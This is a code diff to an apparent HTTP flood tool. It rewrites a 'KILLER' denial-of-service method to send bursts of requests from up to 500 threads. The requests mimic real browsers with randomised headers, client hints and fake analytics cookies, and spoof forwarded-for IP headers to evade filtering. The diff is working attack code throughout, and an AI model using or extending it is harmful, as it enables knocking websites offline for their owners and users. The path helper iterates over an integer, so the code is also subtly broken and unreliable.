@@ -1054,9 +1054,157 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    _KILLER_METHODS = ("GET", "GET", "GET", "POST", "HEAD", "PUT")
+    _KILLER_PATHS = (
+        "/?page=%d", "/search?q=%s", "/api/v1/%s", "/static/%s",
+        "/images/%s", "/assets/%s", "/data/%s", "/feed/%s",
+        "/index.html?%s=%s", "/%s", "/%s/%s",
+    )
+    _KILLER_EXTRAS = (
+        "DNT: 1\r\n",
+        "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+        "Sec-Ch-Ua-Mobile: ?0\r\n"
+        "Sec-Ch-Ua-Platform: \"Windows\"\r\n",
+        "Sec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\"\r\n"
+        "Sec-Ch-Ua-Mobile: ?0\r\n"
+        "Sec-Ch-Ua-Platform: \"macOS\"\r\n",
+        "Sec-Ch-Ua: \"Brave\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\r\n"
+        "Sec-Ch-Ua-Mobile: ?0\r\n"
+        "Sec-Ch-Ua-Platform: \"Linux\"\r\n",
+        "Priority: u=1, i\r\n",
+        "X-Requested-With: XMLHttpRequest\r\n",
+        "DNT: 1\r\nPriority: u=0, i\r\n",
+    )
+
     def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
+        global REQUESTS_SENT, BYTES_SEND
+        max_workers = min(self._rpc * 10, 500)
+        burst_size = max(max_workers // 4, 10)
+        calm_delay = max(0.05, 1.0 / max_workers)
+        burst_delay = 0.0005
+        with ThreadPoolExecutor(max_workers=max_workers) as pool:
+            while True:
+                for _ in range(burst_size):
+                    pool.submit(self._killer_worker)
+                sleep(burst_delay)
+                for _ in range(burst_size // 3):
+                    pool.submit(self._killer_worker)
+                sleep(calm_delay)
+
+    def _killer_worker(self) -> None:
+        for attempt in range(3):
+            s = None
+            try:
+                s = self.open_connection()
+                for _ in range(self._rpc):
+                    payload = self._killer_payload()
+                    if not Tools.send(s, payload):
+                        break
+                    if randchoice([True, False]):
+                        sleep(randchoice([0.001, 0.005, 0.01]))
+                break
+            except Exception:
+                sleep(0.05 * (attempt + 1))
+            finally:
+                Tools.safe_close(s)
+
+    def _killer_payload(self) -> bytes:
+        http_method = randchoice(self._KILLER_METHODS)
+        rand_path = self._killer_rand_path()
+        rand_ua = randchoice(self._useragents)
+        rand_ref = randchoice(self._referers)
+        rand_extra = randchoice(self._KILLER_EXTRAS)
+        spoof = ProxyTools.Random.rand_ipv4()
+        rand_cookie = self._killer_rand_cookie()
+        rand_dnt = randchoice([True, False])
+
+        headers = [
+            "%s %s HTTP/1.1\r\n" % (http_method, rand_path),
+            "Host: %s\r\n" % self._target.authority,
+            "User-Agent: %s\r\n" % rand_ua,
+            "Accept: %s\r\n" % randchoice([
+                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "*/*",
+                "text/plain,text/html,*/*",
+            ]),
+            "Accept-Language: %s\r\n" % randchoice([
+                "en-US,en;q=0.9",
+                "en-GB,en-US;q=0.9,en;q=0.8",
+                "en-US,en;q=0.9,pt;q=0.8",
+                "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
+                "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
+                "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+            ]),
+            "Accept-Encoding: %s\r\n" % randchoice([
+                "gzip, deflate, br",
+                "gzip, deflate",
+                "gzip, deflate, br, zstd",
+            ]),
+            "X-Forwarded-For: %s\r\n" % spoof,
+            "X-Forwarded-Proto: https\r\n",
+            "X-Forwarded-Host: %s\r\n" % self._target.raw_host,
+            "Via: %s\r\n" % spoof,
+            "Client-IP: %s\r\n" % spoof,
+            "Real-IP: %s\r\n" % spoof,
+            "Referrer: %s%s\r\n" % (rand_ref, parse.quote(self._target.human_repr())),
+        ]
+
+        if rand_dnt:
+            headers.append("DNT: 1\r\n")
+        if rand_cookie:
+            headers.append("Cookie: %s\r\n" % rand_cookie)
+        headers.append(rand_extra)
+
+        if http_method == "POST":
+            rand_data = ProxyTools.Random.rand_str(randchoice([16, 32, 64, 128]))
+            headers.append("Content-Type: application/x-www-form-urlencoded\r\n")
+            headers.append("Content-Length: %d\r\n" % (len(rand_data) + 5))
+            headers.append("\r\n")
+            headers.append("data=%s" % rand_data)
+            return str.encode("".join(headers))
+
+        if randchoice([True, False]):
+            headers.append("Cache-Control: no-cache\r\n")
+        if randchoice([True, False]):
+            headers.append("Connection: keep-alive\r\n")
+        if randchoice([True, False]):
+            headers.append("Sec-Fetch-Dest: document\r\n")
+            headers.append("Sec-Fetch-Mode: navigate\r\n")
+            headers.append("Sec-Fetch-Site: none\r\n")
+            headers.append("Sec-Fetch-User: ?1\r\n")
+        if randchoice([True, False]):
+            headers.append("Upgrade-Insecure-Requests: 1\r\n")
+        if randchoice([True, False]):
+            headers.append("Sec-Gpc: 1\r\n")
+        if randchoice([True, False]):
+            headers.append("Pragma: no-cache\r\n")
+
+        headers.append("\r\n")
+        return str.encode("".join(headers))
+
+    def _killer_rand_path(self) -> str:
+        tmpl = randchoice(self._KILLER_PATHS)
+        args = []
+        for _ in tmpl.count("%s"):
+            args.append(ProxyTools.Random.rand_str(randchoice([4, 6, 8, 12, 16])))
+        for _ in tmpl.count("%d"):
+            args.append(randint(1, 999999))
+        return tmpl % tuple(args) if args else tmpl
+
+    def _killer_rand_cookie(self) -> str:
+        parts = []
+        if randchoice([True, False, False]):
+            parts.append("_ga=GA1.2.%d.%d" % (randint(10000000, 99999999), randint(1000000000, 1999999999)))
+        if randchoice([True, False, False]):
+            parts.append("_gid=GA1.2.%d.%d" % (randint(10000000, 99999999), randint(1000000000, 1999999999)))
+        if randchoice([True, False]):
+            parts.append("__cfduid=%s" % ProxyTools.Random.rand_str(43))
+        if randchoice([True, False, False, False]):
+            parts.append("session=%s" % ProxyTools.Random.rand_str(32))
+        if randchoice([True, False, False, False, False]):
+            parts.append("_fbp=fb.1.%d.%d" % (randint(1000000000, 1999999999), randint(100000000, 999999999)))
+        return "; ".join(parts) if parts else ""
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
